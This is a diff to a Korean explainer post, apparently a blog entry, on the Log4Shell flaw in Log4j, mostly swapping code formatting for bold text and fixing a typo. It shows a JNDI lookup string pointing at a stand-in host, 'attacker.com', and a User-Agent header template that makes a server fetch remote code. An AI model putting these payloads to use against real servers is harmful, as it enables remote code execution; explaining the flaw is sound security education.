@@ -37,13 +37,13 @@ Log4j는 Apache Software Foundation에서 개발한 인기있는 [로깅 유틸�
 
 ## Log4j 취약점
 
-현재 문제가 있는 log4j 라이브러리는 `log4j-core-<version>jar`이며, Log4j가 넘겨받은 변수를 그대로 로깅하는 것이 아니라 해당 변수를 분석해 할 수 있는 경우 실행하는 **Lookups** 기능에서 발견되었다.
+현재 문제가 있는 log4j 라이브러리는 **log4j-core-<version>jar**이며, Log4j가 넘겨받은 변수를 그대로 로깅하는 것이 아니라 해당 변수를 분석해 할 수 있는 경우 실행하는 **Lookups** 기능에서 발견되었다.
 
 예를들어, `log.info("Debug: {}", str)`에서 **str**이 **${env:USER}**라면 **USER**가 누군지 찾아서, `Debug: eli_ez3r`라고 문구를 완성하고 해당 문구를 출력하는 경우이다.
 
-현재 취약점은 Lookups기능 중에서도 특히 `JDNI`라는 Lookups을 이용해 공격이 가능하다.
+현재 취약점은 Lookups기능 중에서도 특히 **JDNI**라는 Lookups을 이용해 공격이 가능하다.
 
-Apache Log4j 2의 일부 기능에는 재귀 분석 기능(Recursive Analysis Functions)이 있기 때문에 공격자가 직접 악성 요청을 구성하여 원격 코드 실행 취약점(RCE)을 유발시킬 수 있어 CVSS스코어 10점으로 가장 높은 심각도를 나타내고 있다.
+Apache Log4j 2의 일부 기능에는 **재귀 분석 기능(Recursive Analysis Functions)**이 있기 때문에 공격자가 직접 악성 요청을 구성하여 **원격 코드 실행 취약점(RCE)**을 유발시킬 수 있어 **CVSS스코어 10점**으로 가장 높은 심각도를 나타내고 있다.
 
 취약점 악용에는 특별한 구성이 필요하지 않으며, Alibaba Cloud 보안팀의 검증결과 Apache Struts2, Apache Solr, Apache Druid, Apache Flink 등이 모두 영향을 받는 것으로 알려있다.
 
@@ -69,9 +69,9 @@ log.info("Debug: {}", payload);
 
 여기서 payload는 HTTP Requests에서 요청자가 보낸 문자열이다.
 
-이 문자열이 `${jndi:ldap://attacker.com/classname}`을 포함하면 Log4j는 이를 해석하여 `ldap://attacker.com/classname`을 실행시키게 된다.
+이 문자열이 **${jndi:ldap://attacker.com/classname}**을 포함하면 Log4j는 이를 해석하여 **ldap://attacker.com/classname**을 실행시키게 된다.
 
-현재 가장 쉽게 공격할 수 있는 방법은 HTTP 헤더 `User-Agent`에 ldap주소를 넣어 코드를 다운받는 방법이라고 한다.
+현재 가장 쉽게 공격할 수 있는 방법은 HTTP 헤더 **User-Agent**에 ldap주소를 넣어 코드를 다운받는 방법이라고 한다.
 
 ```
 User-Agent : ${jndi:ldap://<host>:<port>/<path>}
@@ -87,7 +87,7 @@ User-Agent : ${jndi:ldap://<host>:<port>/<path>}
 
 Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 단계의 취약점으로 분류된다.
 
-하지만 그 외에도 아래와 같은 점들 때문에 `사상 최약의 취약점`이라고 불려지고 있다.
+하지만 그 외에도 아래와 같은 점들 때문에 **사상 최악의 취약점**이라고 불려지고 있다.
 
 1. Log4j는 자바 기반의 소프트웨어에서 굉장히 많이 쓰여지고 있는 라이브러리이다. => 공격 대상/범위가 광범위하다
 2. 공격 방법이 간단하다. => 복잡한 과정없이 POC코드를 전송하기만 하면 공격이 성공한다.
